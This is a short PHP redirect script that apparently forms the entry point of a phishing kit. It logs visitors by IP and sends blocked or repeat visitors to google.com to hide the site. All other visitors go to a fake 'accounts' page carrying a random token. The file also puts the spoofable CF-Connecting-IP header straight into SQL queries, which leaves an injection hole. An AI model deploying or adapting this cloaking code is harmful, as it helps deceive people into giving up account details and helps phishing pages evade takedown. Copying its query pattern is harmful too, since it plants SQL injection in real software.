<?php

require_once "cod3rconfig/registro.php";
require_once "cod3rconfig/conexao.php";
require_once "cod3rconfig/data.php";

$ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);


function geraSenha($tamanho = 8, $maiusculas = true, $numeros = true) {
    $lmai       = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJLMNOPQRESTVXZWYK';
    $num        = '1234567890';
    $retorno    = '';
    $caracteres = '';

if($maiusculas) $caracteres .= $lmai;
if($numeros) $caracteres .= $num;

$len = strlen($caracteres);
for ($n = 1; $n <= $tamanho; $n++) {
    $rand = mt_rand(1, $len);
    $retorno .= $caracteres[$rand-1];
}
return $retorno;
}


$dateEncode1 = geraSenha(60,true,false);


$dateEncode  = date("d/m/Y H:i:s");


$codigo = geraSenha(40, true, true);

$query_ip   = "SELECT * FROM visitas WHERE ip = '$ip'";
$verificaip = mysqli_query(DBConnect(), $query_ip) or die(mysqli_error());
$row_ip     = mysqli_fetch_assoc($verificaip);
$totalip    = mysqli_num_rows($verificaip);

$alt  = $row_ip['acessou'];
$alt2 = 1;
$alto = $alt+$alt2;


$query_verificacadastro1 = "SELECT * FROM ipblock WHERE ip = '$ip'";
$verificacadastro1 = mysqli_query(DBCOnnect(), $query_verificacadastro1) or die(mysqli_error(DBCOnnect()));
$row_verificacadastro1 = mysqli_fetch_assoc($verificacadastro1);

if($row_verificacadastro1['ip'] == $ip ) {
    header("Location: https://www.google.com/");
}else{

 if($alt >= 3) {
    header("location: https://www.google.com");
  }else{

    $mobile = FALSE;
    $user_agents = array("iPhone","iPad","Android","webOS","BlackBerry","iPod","Symbian","IsGeneric");

    foreach($user_agents as $user_agent) {
        if (strpos($_SERVER['HTTP_USER_AGENT'], $user_agent) !== FALSE) {
            $mobile = TRUE;
            $modelo = $user_agent;
            break;
        }
    }

    if ($mobile) {
        header("Location: accounts/?resume=".$dateEncode1);
    }else{
     header("Location:    accounts/?resume=".$dateEncode1);
    }

}
}
?>